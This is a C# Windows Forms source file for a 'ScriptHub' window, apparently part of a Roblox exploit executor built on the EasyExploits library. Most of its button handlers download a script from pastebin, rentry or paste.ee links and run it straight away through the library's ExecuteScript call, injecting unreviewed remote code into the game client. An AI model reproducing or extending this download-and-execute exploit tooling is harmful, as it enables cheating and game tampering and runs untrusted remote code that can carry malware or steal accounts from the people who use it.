using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using EasyExploits;

namespace Novaline
{
    public partial class ScriptHub : Form
    {
        EasyExploits.Module module = new EasyExploits.Module();
        public ScriptHub()
        {
            InitializeComponent();
        }

        private void siticoneButton9_Click(object sender, EventArgs e)
        {
            this.Hide();
        }

        private void siticoneButton43_Click(object sender, EventArgs e)
        {
            WebClient wb = new WebClient();
            string Script = wb.DownloadString("https://pastebin.com/raw/H2bXX4X3");
            module.ExecuteScript(Script);
        }

        private void siticoneButton15_Click(object sender, EventArgs e)
        {
            WebClient wb = new WebClient();
            string Script = wb.DownloadString("https://pastebin.com/raw/7Gbf40Zi");
            module.ExecuteScript(Script);
        }

        private void siticoneButton29_Click(object sender, EventArgs e)
        {
            WebClient wb = new WebClient();
            string Script = wb.DownloadString("https://rentry.co/punro/raw");
            module.ExecuteScript(Script);
        }

        private void siticoneButton14_Click(object sender, EventArgs e)
        {
            WebClient wb = new WebClient();
            string Script = wb.DownloadString("https://pastebin.com/raw/EhVyKiS6");
            module.ExecuteScript(Script);
        }

        private void siticoneButton8_Click(object sender, EventArgs e)
        {
            WebClient wb = new WebClient();
            string Script = wb.DownloadString("https://pastebin.com/raw/4i4aXw07");
            module.ExecuteScript(Script);
        }

        private void siticoneButton37_Click(object sender, EventArgs e)
        {
            System.Diagnostics.Process.Start("https://robloxscripts.com/scripts/");
        }

        private void siticoneButton28_Click(object sender, EventArgs e)
        {
            WebClient wb = new WebClient();
            string Script = wb.DownloadString("https://rentry.co/kwhe5/raw");
            module.ExecuteScript(Script);
        }

        private void siticoneButton24_Click(object sender, EventArgs e)
        {
            WebClient wb = new WebClient();
            string Script = wb.DownloadString("https://paste.ee/r/yMSMK");
            module.ExecuteScript(Script);
        }

        private void siticoneButton23_Click(object sender, EventArgs e)
        {
            WebClient wb = new WebClient();
            string Script = wb.DownloadString("https://rentry.co/uenif/raw");
            module.ExecuteScript(Script);
        }

        private void siticoneButton10_Click(object sender, EventArgs e)
        {
            WebClient wb = new WebClient();
            string Script = wb.DownloadString("https://paste.ee/r/kE2RD");
            module.ExecuteScript(Script);
        }

        private void siticoneButton42_Click(object sender, EventArgs e)
        {
            WebClient wb = new WebClient();
            string Script = wb.DownloadString("https://paste.ee/r/KKcCD");
            module.ExecuteScript(Script);
        }

        private void siticoneButton41_Click(object sender, EventArgs e)
        {
            WebClient wb = new WebClient();
            string Script = wb.DownloadString("https://paste.ee/r/XOwab");
            module.ExecuteScript(Script);
        }

        private void siticoneButton40_Click(object sender, EventArgs e)
        {
            WebClient wb = new WebClient();
            string Script = wb.DownloadString("https://paste.ee/r/hwTvc");
            module.ExecuteScript(Script);
        }

        private void siticoneButton13_Click(object sender, EventArgs e)
        {
            WebClient wb = new WebClient();
            string Script = wb.DownloadString("https://paste.ee/r/unmoY");
            module.ExecuteScript(Script);
        }

        private void siticoneButton12_Click(object sender, EventArgs e)
        {
            WebClient wb = new WebClient();
            string Script = wb.DownloadString("https://paste.ee/r/L0fzE");
            module.ExecuteScript(Script);
        }

        private void siticoneButton39_Click(object sender, EventArgs e)
        {
            WebClient wb = new WebClient();
            string Script = wb.DownloadString("https://paste.ee/r/uEWwC");
            module.ExecuteScript(Script);
        }
    }
}
